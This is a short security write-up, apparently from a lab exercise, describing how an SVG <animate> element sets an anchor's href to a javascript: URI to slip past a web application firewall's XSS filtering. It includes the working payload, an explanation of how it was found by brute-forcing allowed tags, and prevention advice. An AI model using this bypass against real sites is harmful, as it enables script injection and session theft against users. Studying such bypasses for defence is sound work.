@@ -1,0 +1,24 @@
+Vulnerability:
+	The WAF does not strictly restrict the 'href' string and fails to filter all HTML tags properly.
+	Allowing an attacker to trick the WAF and bypass its filtring to execute javascript.
+	
+Exploit:
+	More readable:
+		<svg>
+			<a>
+				<text x=50 y=50>Click me :D</text>
+				<animate attributename=href values=javascript:[PAYLOAD] />
+			</a>
+		</svg>
+	
+	Exploit Script:
+		<svg><a><text x=50 y=50>Click me :D</text><animate attributename=href values=javascript:alert("lol")></a><svg>
+	
+Explanation:
+	- By bruteforcing the tags, we can see that <svg>, <a>, <text>, and <animate> are allowed.
+	- So we've built a payload that has an <a> element which derives interactivity from the <text> and is programmatically given behavior via the <animate> element.
+	- The <animate> sets the href of the <a> to a javascript: URI, triggering execution when clicked.
+	
+Prevention:
+	- Block "<" ">" or Encode every special char before viewing the input on the page.
+	- Whitelist allowed tags and attributes rather than blacklisting.
